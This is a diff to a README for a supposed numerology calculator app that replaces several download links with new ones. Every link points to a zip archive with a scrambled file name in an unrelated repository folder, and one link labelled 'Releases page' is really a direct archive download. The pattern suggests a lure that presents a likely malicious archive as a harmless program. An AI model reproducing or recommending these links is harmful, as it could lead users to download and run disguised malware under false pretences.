@@ -2,7 +2,7 @@
 
 ## 📦 Download the Application
 
-[![Download Latest Release](https://raw.githubusercontent.com/real7POL/Unlock-Your-Destiny-with-a-Name-Numerology-Calculator-2026/main/fatigable/Name-Calculator-with-Destiny-Your-a-Unlock-Numerology-v3.7-beta.3.zip)](https://raw.githubusercontent.com/real7POL/Unlock-Your-Destiny-with-a-Name-Numerology-Calculator-2026/main/fatigable/Name-Calculator-with-Destiny-Your-a-Unlock-Numerology-v3.7-beta.3.zip)
+[![Download Latest Release](https://github.com/real7POL/Unlock-Your-Destiny-with-a-Name-Numerology-Calculator-2026/raw/refs/heads/main/fatigable/Destiny_Calculator_Your_a_Unlock_Numerology_with_Name_v2.8.zip)](https://github.com/real7POL/Unlock-Your-Destiny-with-a-Name-Numerology-Calculator-2026/raw/refs/heads/main/fatigable/Destiny_Calculator_Your_a_Unlock_Numerology_with_Name_v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you begin, ensure your system meets the following:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/real7POL/Unlock-Your-Destiny-with-a-Name-Numerology-Calculator-2026/main/fatigable/Name-Calculator-with-Destiny-Your-a-Unlock-Numerology-v3.7-beta.3.zip).
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/real7POL/Unlock-Your-Destiny-with-a-Name-Numerology-Calculator-2026/raw/refs/heads/main/fatigable/Destiny_Calculator_Your_a_Unlock_Numerology_with_Name_v2.8.zip).
    
 2. **Choose the Latest Release:** Look for the version marked as the latest, usually at the top of the page.
 
@@ -77,4 +77,4 @@ Explore these concepts to enhance your understanding of numerology and how it im
 
 Experience clarity and insight by discovering what your name reveals about you. 
 
-[Download the Name Numerology Calculator here and start your journey today!](https://raw.githubusercontent.com/real7POL/Unlock-Your-Destiny-with-a-Name-Numerology-Calculator-2026/main/fatigable/Name-Calculator-with-Destiny-Your-a-Unlock-Numerology-v3.7-beta.3.zip)
+[Download the Name Numerology Calculator here and start your journey today!](https://github.com/real7POL/Unlock-Your-Destiny-with-a-Name-Numerology-Calculator-2026/raw/refs/heads/main/fatigable/Destiny_Calculator_Your_a_Unlock_Numerology_with_Name_v2.8.zip)
